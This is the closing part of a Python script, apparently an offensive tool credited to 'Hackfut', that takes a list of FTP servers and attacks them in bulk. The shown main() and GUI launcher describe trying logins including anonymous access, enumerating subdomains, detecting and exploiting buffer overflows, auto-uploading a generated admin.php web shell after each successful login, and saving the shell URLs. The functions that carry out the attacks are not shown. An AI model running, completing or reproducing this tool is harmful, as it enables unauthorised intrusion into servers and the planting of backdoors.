⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⡇⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⣶⣬⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠋⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠀⠀⣀⣠⣴⣶⡶⠃⠐⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠟⠋⠉⣁⣠⣤⣶⣶⣿⣿⣿⣿⡟⢡⡆⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠛⠛⠉⠉⠀⠀⠀⠀⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⡇⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡆⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⡿⠛⢉⠤⠂⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀
⣠⡆⠀⠗⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⡠⢊⣡⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿
⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿
⠋⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⢺⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣠⡄⠀⢸⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡇⠀⠀⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠢⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢸⡇⠀⡆⢹⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠀⠀⠀⠀⠀⠺⠃⠀⠀⠀⢀⡀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
{Colors.RESET}"""
    print(banner)

def main():
    """Main function"""
    print_banner()
    
    if len(sys.argv) < 2:
        print(f"{Colors.RED}Usage: python {sys.argv[0]} <ftp_targets.txt>{Colors.RESET}")
        print(f"{Colors.YELLOW}Target format: hostname or hostname:port{Colors.RESET}")
        print(f"{Colors.YELLOW}Example: ftp.example.com or 192.168.1.1:2121{Colors.RESET}")
        print(f"{Colors.YELLOW}⚠️  URLs like http://example.com will be automatically cleaned!{Colors.RESET}")
        print(f"{Colors.MAGENTA}🔥 NEW: Auto-subdomain discovery & Buffer Overflow detection & Shell saving!{Colors.RESET}")
        sys.exit(1)
        
    input_file = sys.argv[1]
    
    if not os.path.exists(input_file):
        print(f"{Colors.RED}[ERROR] File not found: {input_file}{Colors.RESET}")
        sys.exit(1)

    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            targets = [line.strip() for line in f if line.strip()]
    except:
        print(f"{Colors.RED}[ERROR] Cannot read file: {input_file}{Colors.RESET}")
        sys.exit(1)

    if not targets:
        print(f"{Colors.RED}[ERROR] No FTP targets found{Colors.RESET}")
        sys.exit(1)
    
    # Nettoyer les cibles
    cleaned_targets = clean_targets_list(targets)
    
    if not cleaned_targets:
        print(f"{Colors.RED}[ERROR] No valid targets found after cleaning{Colors.RESET}")
        sys.exit(1)
    
    global_stats['total'] = len(cleaned_targets)
    global_stats['start_time'] = time.time()
    
    print(f"{Colors.CYAN}[INFO] Loaded {len(cleaned_targets)} FTP targets{Colors.RESET}")
    print(f"{Colors.YELLOW}[INFO] Threads: {MAX_WORKERS}{Colors.RESET}")
    print(f"{Colors.GREEN}[INFO] Results: {RESULTS_FILE}{Colors.RESET}")
    print(f"{Colors.GREEN}[INFO] Active FTP: {ACTIVE_FTP_FILE}{Colors.RESET}")
    print(f"{Colors.GREEN}[INFO] Subdomains: {SUBDOMAINS_FILE}{Colors.RESET}")
    print(f"{Colors.RED}[INFO] Buffer Overflow: {BUFFER_OVERFLOW_FILE}{Colors.RESET}")
    print(f"{Colors.MAGENTA}[INFO] Auto-upload: admin.php after successful login{Colors.RESET}")
    print(f"{Colors.MAGENTA}[INFO] Shell saving: URLs saved to {SHELLS_FILE}{Colors.RESET}")
    print(f"{Colors.BLUE}[INFO] Auto-subdomain discovery: Enabled{Colors.RESET}")
    print(f"{Colors.RED}[INFO] Buffer Overflow detection: Enabled{Colors.RESET}")
    print(f"{Colors.WHITE}{'='*60}{Colors.RESET}\n")

    # Initialize results files
    for filename in [RESULTS_FILE, ACTIVE_FTP_FILE, UPLOAD_LOG_FILE, SUBDOMAINS_FILE, BUFFER_OVERFLOW_FILE, SHELLS_FILE]:
        if not os.path.exists(filename):
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"# {filename} - {datetime.now()}\n")
                f.write(f"# decode By Hackfut -- JOIN TG--@HackfutS3c\n")
                f.write(f"# Advanced Edition with Subdomains & Buffer Overflow & Shell Saving\n")
                f.write(f"# {'='*50}\n")

    # Create admin.php file
    create_admin_php()
    print(f"{Colors.GREEN}[INFO] Created admin.php for auto-upload{Colors.RESET}")

    try:
        process_ftp_targets(cleaned_targets)
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Stopped by user{Colors.RESET}")
        
    elapsed = time.time() - global_stats['start_time']
    
    print(f"\n{Colors.WHITE}{'='*60}{Colors.RESET}")
    print(f"{Colors.GREEN}[✓] Completed in {elapsed:.2f} seconds{Colors.RESET}")
    print(f"{Colors.CYAN}[✓] Total FTP targets: {global_stats['total']}{Colors.RESET}")
    print(f"{Colors.BLUE}[✓] Active FTP servers: {global_stats['active_ftp']}{Colors.RESET}")
    print(f"{Colors.GREEN}[✓] Successful: {global_stats['success']}{Colors.RESET}")
    print(f"{Colors.MAGENTA}[✓] Anonymous access: {global_stats['anonymous_access']}{Colors.RESET}")
    print(f"{Colors.BLUE}[✓] Subdomains found: {global_stats['subdomains_found']}{Colors.RESET}")
    print(f"{Colors.RED}[✓] Buffer Overflow vulns: {global_stats['buffer_overflow_vulns']}{Colors.RESET}")
    print(f"{Colors.RED}[✓] Buffer Overflow exploited: {global_stats['buffer_overflow_exploited']}{Colors.RESET}")
    print(f"{Colors.RED}[✓] Failed: {global_stats['failed']}{Colors.RESET}")
    print(f"{Colors.GREEN}[✓] Uploads successful: {global_stats['uploads_success']}{Colors.RESET}")
    print(f"{Colors.RED}[✓] Uploads failed: {global_stats['uploads_failed']}{Colors.RESET}")
    print(f"{Colors.MAGENTA}[✓] Shells saved: {global_stats['shells_saved']}{Colors.RESET}")
    
    if global_stats['total'] > 0:
        success_rate = (global_stats['success'] / global_stats['total']) * 100
        active_rate = (global_stats['active_ftp'] / global_stats['total']) * 100
        upload_rate = (global_stats['uploads_success'] / global_stats['success'] * 100) if global_stats['success'] > 0 else 0
        shell_rate = (global_stats['shells_saved'] / global_stats['success'] * 100) if global_stats['success'] > 0 else 0
        
        print(f"{Colors.BOLD}[✓] Success rate: {success_rate:.1f}%{Colors.RESET}")
        print(f"{Colors.BOLD}[✓] Active FTP rate: {active_rate:.1f}%{Colors.RESET}")
        print(f"{Colors.BOLD}[✓] Upload success rate: {upload_rate:.1f}% of successful logins{Colors.RESET}")
        print(f"{Colors.BOLD}[✓] Shell save rate: {shell_rate:.1f}% of successful logins{Colors.RESET}")
        
    print(f"{Colors.MAGENTA}[✓] Speed: {global_stats['total']/elapsed:.1f} targets/second{Colors.RESET}")
    print(f"{Colors.WHITE}{'='*60}{Colors.RESET}")

def gui_main():
    """GUI main function"""
    if not GUI_AVAILABLE:
        print("PyQt5 not available. Running in console mode.")
        main()
        return
        
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    
    palette = QPalette()
    palette.setColor(QPalette.Window, QColor(15, 15, 25))
    palette.setColor(QPalette.WindowText, Qt.white)
    palette.setColor(QPalette.Base, QColor(25, 25, 35))
    palette.setColor(QPalette.AlternateBase, QColor(35, 35, 45))
    palette.setColor(QPalette.ToolTipBase, Qt.white)
    palette.setColor(QPalette.ToolTipText, Qt.white)
    palette.setColor(QPalette.Text, Qt.white)
    palette.setColor(QPalette.Button, QColor(35, 35, 45))
    palette.setColor(QPalette.ButtonText, Qt.white)
    palette.setColor(QPalette.BrightText, Qt.red)
    palette.setColor(QPalette.Highlight, QColor(0, 255, 65))
    palette.setColor(QPalette.HighlightedText, Qt.black)
    app.setPalette(palette)
    
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())

if __name__ == '__main__':
    if len(sys.argv) == 1:
        if GUI_AVAILABLE:
            gui_main()
        else:
            print("PyQt5 not available. Running in console mode.")
            main()
    else:
        main()